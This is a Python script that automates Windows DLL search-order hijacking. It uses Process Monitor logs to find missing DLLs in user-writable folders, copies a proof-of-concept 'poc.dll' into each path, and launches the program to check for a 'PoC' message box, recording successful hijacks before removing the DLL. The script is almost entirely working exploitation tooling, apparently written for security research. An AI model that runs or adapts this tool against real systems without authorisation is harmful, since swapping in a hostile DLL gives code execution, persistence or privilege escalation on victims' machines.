import os
import pandas as pd
import subprocess
from pywinauto import Desktop, Application
import time
procmon_path = r"C:\Tools\SysinternalsSuite\Procmon64.exe" # Add path to ProcMon executable


def message_box_present():
    app = Application(backend="uia")
    try:
        win = app.connect(title="PoC")
    except:
        return 0
    return 1


def test_writable(folder_path):
    """It is easier to ask for forgiveness than for permission"""
    try:
        with open(folder_path + "\\test.txt", "w+") as f:
            f.writelines(["This is a test"])
        os.remove(folder_path + "\\test.txt")
        return 1
    except Exception as e:
        return 0

def procmon():
    print("Procmon will start soon. Start using various apps and stop Procmon when done.")
    os.system(procmon_path + " /Terminate")
    os.system(procmon_path + " /Minimized /AcceptEula /quiet /backingfile log.pml")
    os.system(procmon_path + " /OpenLog log.pml /SaveAs log.csv")

def parse_logs():
    log_file = pd.read_csv("log.csv")
    log_file.fillna("", inplace=True)
    filtered = log_file[log_file["Result"].str.contains("NOT FOUND") & (log_file["Path"].str.endswith(".dll") | log_file["Path"]
                                                                        .str.endswith(".DLL"))]
    uniq = {}
    for proc, path in zip(filtered["Image Path"], filtered["Path"]):
        if test_writable('\\'.join(path.split("\\")[:-1])) == 1:
            uniq[path] = proc
    potential_dll = {"Process": [], "DLL": []}
    for dll in uniq:
        potential_dll["DLL"].append(dll)
        potential_dll["Process"].append(uniq[dll])
    return potential_dll


def hijack(potential_dll):
    for proc, path in zip(potential_dll["Process"], potential_dll["DLL"]):
        if not ("Procmon64.exe" in proc) and not ("python.exe" in proc):
            print(proc, path)
            os.system(f'copy poc.dll "{path}"')
            print(f"Proof-of-Concept DLL copied. Running {proc}.")
            p = subprocess.Popen([proc])
            try:
                    p.wait(2)
            except subprocess.TimeoutExpired:
                if message_box_present() == 1:
                    print("Hijacked!")
                    with open("hijacked.txt", "a+") as f:
                        f.writelines([f"{proc} # {path}\n"])
            p.kill()
            time.sleep(.5)
            flag = 1
            while flag == 1:
                try:
                    os.remove(path)
                    flag = 0
                except Exception as e:
                    print(e)
                    time.sleep(1)
                    p.kill()
                    flag = 1
            print("Removed the DLL!")

def workflow():
    procmon()
    potential_dll = parse_logs()
    processes = list(set(potential_dll["Process"]))
    for i, path in enumerate(processes):
        print(i, path)
    x = input("Filter proc number: ")
    new_potential = {"Process":[], "DLL":[]}
    for proc, dll in zip(potential_dll["Process"], potential_dll["DLL"]):
        if proc == processes[int(x)]:
            new_potential["Process"].append(proc)
            new_potential["DLL"].append(dll)

    print(new_potential)
    hijack(new_potential)

workflow()
